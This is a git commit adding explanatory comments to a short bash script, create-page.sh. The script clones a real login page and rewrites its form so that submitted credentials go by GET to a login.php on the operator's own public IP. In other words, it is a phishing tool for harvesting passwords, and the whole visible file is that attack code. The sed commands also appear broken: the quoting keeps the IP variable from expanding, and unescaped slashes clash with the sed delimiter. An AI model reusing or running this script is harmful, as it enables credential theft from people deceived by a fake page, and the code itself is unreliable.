736cd270cd629720b67d09ae508df65b9029b189
Ofek Vardi <ofekvar1@gmail.com>
2022-05-14 17:55:35 +0300

    Add comments to shell script

--- create-page.sh
+++ create-page.sh
@@ -1,7 +1,11 @@
 #!/bin/bash
+# Get host public IPv4 address
 ip=$(curl -s ifconfig.me)
+# Get a legitimate login page link
 printf "Please provide a login page link: "
 read page
+# Fetch login page source code
 curl -sL $page > login.html
+# Replace the 'action' and 'method' form attributes
 sed -i 's/action="[^"]*/action="http://$ip/login.php' login.html
 sed -i 's/method="[^"]*/method="get/' login.html
